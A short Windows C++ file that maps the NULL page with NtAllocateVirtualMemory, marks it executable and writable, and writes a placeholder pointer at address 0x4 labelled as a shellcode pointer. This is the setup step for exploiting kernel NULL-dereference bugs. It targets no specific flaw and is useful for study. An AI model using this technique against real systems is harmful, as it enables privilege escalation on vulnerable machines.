#include "stdafx.h"
#include <windows.h>

typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG ZeroBits,
	PULONG AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);
  
int _tmain(int argc, _TCHAR* argv[]) {

	PNtAllocateVirtualMemory NtAllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtAllocateVirtualMemory");

	PVOID BaseAddress = (PVOID)0x1;
	SIZE_T RegionSize = 1024; 

	NTSTATUS ntStatus = NtAllocateVirtualMemory(
		GetCurrentProcess(), 
		&BaseAddress, 
		0, 
		&RegionSize, 
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN, 
		PAGE_EXECUTE_READWRITE 
		);

	PVOID ShellcodePtr = (PVOID)((ULONG)0x4);
	*(PULONG)ShellcodePtr = (ULONG)0x12345678;
	
}
